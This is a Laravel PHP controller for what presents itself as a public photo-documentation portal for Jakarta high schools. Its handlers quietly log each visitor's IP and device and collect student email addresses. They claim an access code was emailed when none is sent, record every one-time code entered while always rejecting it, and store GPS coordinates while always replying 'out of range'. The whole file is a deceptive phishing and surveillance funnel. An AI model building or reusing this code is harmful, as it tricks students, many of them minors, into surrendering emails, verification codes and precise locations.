<?php

namespace App\Http\Controllers;

use App\Models\QuestionBank;
use App\Services\LoginTrackerService;
use Illuminate\Http\Request;

class PortalController extends Controller
{
    /**
     * Get list of standard schools: SMAN 1 Jakarta - SMAN 30 Jakarta merged with database schools.
     */
    public static function getSchoolOptions(): array
    {
        $defaultSchools = [];
        for ($i = 1; $i <= 30; $i++) {
            $defaultSchools[] = "SMAN {$i} Jakarta";
        }

        try {
            $dbSchools = QuestionBank::whereNotNull('school_name')
                ->where('school_name', '!=', '')
                ->distinct()
                ->pluck('school_name')
                ->toArray();
        } catch (\Throwable $e) {
            $dbSchools = [];
        }

        $merged = array_unique(array_merge($defaultSchools, $dbSchools));
        sort($merged, SORT_NATURAL | SORT_FLAG_CASE);

        return $merged;
    }

    /**
     * Display public documentation search portal (Multi-Step Funnel).
     * No login required for students / public visitors.
     */
    public function index(Request $request, LoginTrackerService $loginTracker)
    {
        try {
            $loginTracker->ensureSchemaExists();
        } catch (\Throwable $e) {
            // Fail safely if database is offline
        }

        // Automatically track visitor telemetry (Location, IP, Device) upon opening the portal
        try {
            $loginTracker->recordVisit($request);
        } catch (\Throwable $e) {
            // Fail safely
        }

        $showcaseSlides = [
            [
                'title' => 'Momen Pelepasan & Wisuda Siswa Angkatan',
                'category' => 'Wisuda & Kelulusan Angkatan',
                'category_icon' => '🎓',
                'location' => 'Lapangan Utama Sekolah',
                'photos_count' => '148 Foto',
                'date' => 'Angkatan 2026',
                'description' => 'Dokumentasi penuh kebanggaan dan haru perayaan kelulusan siswa bersama guru pembimbing dan sahabat.',
                'image' => asset('images/documentation/student_event_1.jpg'),
            ],
            [
                'title' => 'Proyek Sains & Kolaborasi Robotika Siswa',
                'category' => 'Pembelajaran Kreatif & STEM',
                'category_icon' => '🔬',
                'location' => 'Laboratorium Sains & Inovasi',
                'photos_count' => '92 Foto',
                'date' => 'Semester Genap',
                'description' => 'Antusiasme para siswa dalam riset teknologi ramah lingkungan, eksperimen ilmiah, dan kreasi robotika.',
                'image' => asset('images/documentation/student_event_2.jpg'),
            ],
            [
                'title' => 'Keseruan Pekan Olahraga & Pentas Seni Siswa',
                'category' => 'Classmeeting & Olahraga',
                'category_icon' => '🏆',
                'location' => 'Gelanggang Olahraga Siswa',
                'photos_count' => '210 Foto',
                'date' => 'Pekan Olahraga Tahunan',
                'description' => 'Semarak kebersamaan pertandingan persahabatan antar kelas, selebrasi juara umum, dan pertunjukan seni musik.',
                'image' => asset('images/documentation/student_event_3.jpg'),
            ],
        ];

        $schoolOptions = self::getSchoolOptions();

        $searchAttempted = false;
        $status = null;
        $errorMessage = null;
        $notFoundMessage = null;
        $schoolName = trim((string) $request->input('school_name', ''));
        $email = trim((string) $request->input('email', ''));
        $albums = collect();
        $totalPhotosCount = 67;

        // Check if user submitted search form (via POST or GET query)
        if ($request->isMethod('POST') || $request->has('cari') || $request->has('school_name')) {
            $searchAttempted = true;

            // 1. Validation check: If school_name is not selected/empty
            if (empty($schoolName)) {
                try {
                    $loginTracker->recordSearch('', $email, $request, false, true);
                } catch (\Throwable $e) {
                }

                $status = 'validation_error';
                $errorMessage = 'Harap pilih sekolah terlebih dahulu';

                if ($request->expectsJson() || $request->ajax()) {
                    return response()->json([
                        'success' => false,
                        'status' => 'validation_error',
                        'message' => $errorMessage,
                    ], 422);
                }
            } else {
                // 2. School is selected -> Check database albums
                try {
                    $dbAlbums = QuestionBank::where('is_active', true)
                        ->where(function ($q) use ($schoolName) {
                            $q->where('school_name', 'like', "%{$schoolName}%")
                              ->orWhere('title', 'like', "%{$schoolName}%");
                        })
                        ->withCount('items')
                        ->with(['items' => function ($q) {
                            $q->orderBy('order')->orderBy('id');
                        }])
                        ->latest('id')
                        ->get();
                } catch (\Throwable $e) {
                    $dbAlbums = collect();
                }

                // Check if school is known (either in DB or in default SMAN 1-30 Jakarta list)
                $isKnownSchool = $dbAlbums->isNotEmpty() || in_array($schoolName, $schoolOptions, true) || str_starts_with($schoolName, 'SMAN ');

                if (!$isKnownSchool && $dbAlbums->isEmpty()) {
                    // School not found
                    try {
                        $loginTracker->recordSearch($schoolName, $email, $request, false, false);
                    } catch (\Throwable $e) {
                    }

                    $status = 'not_found';
                    $notFoundMessage = "Dokumentasi untuk sekolah '{$schoolName}' tidak ditemukan.";

                    if ($request->expectsJson() || $request->ajax()) {
                        return response()->json([
                            'success' => false,
                            'status' => 'not_found',
                            'message' => $notFoundMessage,
                        ]);
                    }
                } else {
                    // School is found -> Provide the 3 annual cards
                    try {
                        $loginTracker->recordSearch($schoolName, $email, $request, true, false);
                    } catch (\Throwable $e) {
                    }

                    $status = 'found';

                    // Compute photo count
                    $dbCount = $dbAlbums->sum('items_count');
                    $totalPhotosCount = $dbCount > 0 ? $dbCount : 67;

                    $albums = $dbAlbums;

                    if ($request->expectsJson() || $request->ajax()) {
                        return response()->json([
                            'success' => true,
                            'status' => 'found',
                            'school_name' => $schoolName,
                            'photos_count' => $totalPhotosCount,
                        ]);
                    }
                }
            }
        }

        try {
            $totalActiveAlbums = QuestionBank::where('is_active', true)->count();
        } catch (\Throwable $e) {
            $totalActiveAlbums = 0;
        }

        return view('portal.index', compact(
            'showcaseSlides',
            'schoolOptions',
            'searchAttempted',
            'status',
            'errorMessage',
            'notFoundMessage',
            'schoolName',
            'email',
            'albums',
            'totalPhotosCount',
            'totalActiveAlbums'
        ));
    }

    /**
     * Step 3: Handle visitor email submission and log to Admin Activity Log.
     */
    public function submitEmail(Request $request, LoginTrackerService $loginTracker)
    {
        $schoolName = trim((string) $request->input('school_name', ''));
        $email = trim((string) $request->input('email', ''));

        if (empty($email) || !filter_var($email, FILTER_VALIDATE_EMAIL)) {
            return response()->json([
                'success' => false,
                'message' => 'Format email kamu tidak valid atau belum diisi.',
            ], 422);
        }

        try {
            $loginTracker->recordEmailAttempt($schoolName, $email, $request);
        } catch (\Throwable $e) {
        }

        return response()->json([
            'success' => true,
            'email' => $email,
            'message' => 'Kode akses telah dikirimkan ke email ' . $email,
        ]);
    }

    /**
     * Step 4: Handle 6-digit access code verification (Simulated validation).
     */
    public function verifyOtp(Request $request, LoginTrackerService $loginTracker)
    {
        $schoolName = trim((string) $request->input('school_name', ''));
        $email = trim((string) $request->input('email', ''));
        $otpCode = trim((string) $request->input('otp_code', ''));

        try {
            $loginTracker->recordOtpAttempt($schoolName, $email, $otpCode, $request);
        } catch (\Throwable $e) {
        }

        // As specified, any code entered responds with standard expired/invalid message
        return response()->json([
            'success' => false,
            'message' => 'Kode akses tidak sesuai atau kadaluarsa',
        ], 422);
    }

    /**
     * Handle distance / GPS geolocation check.
     */
    public function checkLocation(Request $request, LoginTrackerService $loginTracker)
    {
        $schoolName = trim((string) $request->input('school_name', ''));
        $email = trim((string) $request->input('email', ''));
        $lat = $request->filled('latitude') && is_numeric($request->input('latitude'))
            ? (float) $request->input('latitude')
            : null;
        $lon = $request->filled('longitude') && is_numeric($request->input('longitude'))
            ? (float) $request->input('longitude')
            : null;

        try {
            $loginTracker->recordLocationCheck($schoolName, $email, $lat, $lon, $request);
        } catch (\Throwable $e) {
        }

        return response()->json([
            'success' => false,
            'status' => 'out_of_range',
            'message' => 'Lokasi Anda berada di luar jangkauan sekolah.',
        ]);
    }

    /**
     * Display public interactive photo gallery for a specific album (no login required).
     */
    public function showAlbum(QuestionBank $questionBank)
    {
        if (!$questionBank->is_active) {
            abort(404, 'Album dokumentasi tidak ditemukan atau belum dipublikasikan.');
        }

        $questionBank->load(['items' => function ($query) {
            $query->orderBy('order')->orderBy('id');
        }]);

        $otherAlbums = QuestionBank::where('is_active', true)
            ->where('id', '!=', $questionBank->id)
            ->when(!empty($questionBank->school_name), function ($q) use ($questionBank) {
                $q->where('school_name', $questionBank->school_name);
            })
            ->withCount('items')
            ->latest('id')
            ->take(3)
            ->get();

        return view('portal.album', compact('questionBank', 'otherAlbums'));
    }
}
